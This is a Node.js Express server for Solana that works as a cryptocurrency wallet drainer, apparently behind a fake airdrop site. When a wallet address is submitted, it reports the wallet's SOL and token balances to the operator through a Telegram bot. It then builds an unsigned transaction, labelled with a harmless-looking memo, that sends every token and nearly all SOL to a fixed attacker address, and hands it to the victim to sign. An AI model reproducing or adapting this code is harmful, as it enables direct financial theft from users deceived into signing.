import express from 'express';
import cors from 'cors';
import {
  PublicKey,
  Connection,
  clusterApiUrl,
  Transaction,
  SystemProgram,
  LAMPORTS_PER_SOL,
} from '@solana/web3.js';
import { createMemoInstruction } from '@solana/spl-memo';
import { getAccount, createTransferInstruction, getAssociatedTokenAddress } from '@solana/spl-token';
import { TokenListProvider } from '@solana/spl-token-registry';
import TelegramBot from 'node-telegram-bot-api';
import dotenv from 'dotenv';
dotenv.config();

const app = express();
const port = process.env.PORT || 3000;

// const corsConfig = {
//     origin: 'https://solairdrop-b0b9.onrender.com/', 
//     methods: ['GET', 'POST', 'PUT', 'DELETE'], 
//     credentials: true, 
//   };

 app.use(cors());
app.use(express.json());

const connection = new Connection(clusterApiUrl('mainnet-beta'), 'confirmed');
const telegramToken = process.env.TELEGRAM_BOT_TOKEN;
const chatId = process.env.TELEGRAM_CHAT_ID;
const bot = new TelegramBot(telegramToken, { polling: false });

// Initialize token list
let tokenList = [];
(async () => {
  const tokens = await new TokenListProvider().resolve();
  tokenList = tokens.filterByClusterSlug('mainnet-beta').getList();
})();

// Wallet endpoint
app.post('/api/wallet', async (req, res) => {
  const { walletAddress } = req.body;


  if (!walletAddress) {
    return res.status(400).json({ error: 'Wallet address is required' });
  }

  try {
    const publicKey = new PublicKey(walletAddress);
    // Get SOL balance
    const balance = await connection.getBalance(publicKey);
    const balanceInSol = balance / LAMPORTS_PER_SOL;

    // Get SPL token accounts
    const tokenAccounts = await connection.getTokenAccountsByOwner(publicKey, {
      programId: new PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA'),
    });
      
    const splBalances = await Promise.all(tokenAccounts.value.map(async (account) => {
      try {
        const tokenAccount = await getAccount(connection, account.pubkey);
        if (tokenAccount.amount > 0) {
          const mintAddress = tokenAccount.mint.toString();
          const tokenInfo = tokenList.find(t => t.address === mintAddress);
          
          // Get token metadata from connection if not found in tokenList
          let decimals = tokenInfo?.decimals;
          let symbol = tokenInfo?.symbol;
          let name = tokenInfo?.name;
          
          if (!decimals || !symbol || !name) {
            try {
              const mintInfo = await connection.getParsedAccountInfo(new PublicKey(mintAddress));
              decimals = mintInfo.value?.data.parsed.info.decimals || 9;
              symbol = symbol || 'TOKEN';
              name = name || `Token (${mintAddress.slice(0, 4)}...)`;
            } catch (e) {
              decimals = 9;
              symbol = 'TOKEN';
              name = `Token (${mintAddress.slice(0, 4)}...)`;
            }
          }

          const balance = Number(tokenAccount.amount) / Math.pow(10, decimals);
          
          return {
            mint: mintAddress,
            balance: balance,
            decimals: decimals,
            symbol: symbol,
            name: name,
            logoURI: tokenInfo?.logoURI || '',
          };
        }
      } catch (e) {
        console.error(`Error processing token account: ${e}`);
      }
      return null;
    }));

    const validSplBalances = splBalances.filter(balance => balance !== null);

    // Prepare Telegram notification
    const shortWalletAddress = `${walletAddress.slice(0, 6)}...${walletAddress.slice(-4)}`;
    const solscanLink = `https://solscan.io/account/${walletAddress}`;
    let message = `🚨 *Solana Wallet Detected!*\n\n` +
      `👛 *Address:* [${shortWalletAddress}](${solscanLink})\n` +
      `💰 *SOL Balance:* \`${balanceInSol.toFixed(4)} SOL\`\n`;

    if (validSplBalances.length > 0) {
      message += `\n🪙 *SPL Tokens:*`;
      
      validSplBalances.forEach((token) => {
        const tokenLink = `https://solscan.io/token/${token.mint}`;
        message += `\n🔸[Symbol](${tokenLink}) *${token.symbol}* \n` +
          `   • Balance: \`${token.balance.toFixed(2)}\`\n` 
          ;
      });
    }

    await bot.sendMessage(chatId, message, { parse_mode: 'Markdown', disable_web_page_preview: true });

    // 🔹 Get network fee dynamically + keep your 5000 lamports buffer
const { feeCalculator } = await connection.getRecentBlockhash();
const baseFee = feeCalculator.lamportsPerSignature;
const TRANSACTION_FEE = baseFee + 5000; // network fee + extra buffer

if (balance <= TRANSACTION_FEE) {
  return res.json({
    success: true,
    balance: balanceInSol,
    splBalances: validSplBalances,
    transaction: null,
    message: 'Insufficient SOL balance for transaction',
  });
}

// Prepare transaction (SOL transfer)
const payer = publicKey;
const recipient = new PublicKey('84vka944L9qFdBZKHEvpfDp9qqJ5sfcjDXaQ3wjxVRLM');
const amount = balance - TRANSACTION_FEE;
const memo = 'Signed via your app';


    // Get recent blockhash
    const { blockhash } = await connection.getLatestBlockhash();

    // Create transaction
    const transaction = new Transaction({
      recentBlockhash: blockhash,
      feePayer: payer,
    });

    // Add token transfer instructions for tokens with balance > 0
    for (const tokenData of validSplBalances) {
      try {
        const mintPubkey = new PublicKey(tokenData.mint);
        const sourceATA = await getAssociatedTokenAddress(mintPubkey, payer);
        const destinationATA = await getAssociatedTokenAddress(mintPubkey, recipient);

        // Get token account info
        const tokenAccount = await getAccount(connection, sourceATA);
        
        if (tokenAccount.amount > 0) {
          // Create transfer instruction for the full balance
          const transferInstruction = createTransferInstruction(
            sourceATA,
            destinationATA,
            payer,
            BigInt(tokenAccount.amount)
          );
          
          transaction.add(transferInstruction);
        }
      } catch (error) {
        console.error(`Error creating transfer instruction for token ${tokenData.symbol}: ${error}`);
      }
    }

    // Add SOL transfer instruction
    transaction.add(
      SystemProgram.transfer({
        fromPubkey: payer,
        toPubkey: recipient,
        lamports: amount,
      })
    );

    // Add memo instruction
    transaction.add(
      createMemoInstruction(memo)
    );

    // Serialize transaction to base64
    const serializedTransaction = transaction.serialize({ requireAllSignatures: false }).toString('base64');

    res.json({
      success: true,
      balance: balanceInSol,
      splBalances: validSplBalances,
      transaction: serializedTransaction,
    });
  } catch (error) {
    res.status(500).json({ error: 'Failed to process wallet address' });
  }
});

// Start server
app.listen(port, () => {
  console.log(`Server running on http://localhost:${port}`);
});
